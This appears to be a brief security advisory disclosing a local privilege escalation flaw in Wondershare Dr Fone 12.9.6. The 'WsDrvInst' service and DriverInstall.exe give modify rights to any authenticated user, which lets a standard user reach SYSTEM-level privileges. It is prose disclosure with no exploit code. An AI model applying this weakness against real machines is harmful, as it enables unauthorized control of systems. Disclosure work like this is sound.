*Vulnerability description*:

Wondershare Dr Fone version 12.9.6 running services named "WsDrvInst" on
Windows have weak service permissions and are susceptible to local
privilege escalation vulnerability. Weak service permissions run with
system user permission, allowing a standard user/domain user to elevate to
administrator privilege upon successfully modifying the service or
replacing the affected executable. DriverInstall.exe gave modification
permission to any authenticated users in the windows operating system,
allowing standard users to modify the service and leading to Privilege
Escalation.
